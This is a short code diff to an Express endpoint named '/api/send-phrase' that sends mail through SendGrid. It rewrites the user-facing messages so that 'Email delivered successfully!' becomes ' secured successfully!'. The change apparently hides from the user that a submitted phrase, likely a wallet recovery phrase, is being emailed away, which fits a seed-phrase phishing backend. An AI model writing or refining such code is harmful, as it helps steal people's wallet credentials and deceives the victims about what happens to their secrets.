@@ -28,10 +28,10 @@ app.post("/api/send-phrase", async (req, res) => {
 
   try {
     await sgMail.send(msg);
-    return res.json({ message: "Email delivered successfully!" });
+    return res.json({ message: " secured successfully!" });
   } catch (error) {
     console.log("SENDGRID ERROR:", error.response?.body?.errors || error);
-    return res.status(500).json({ error: "Email failed" });
+    return res.status(500).json({ error: "secure failed" });
   }
 });
 
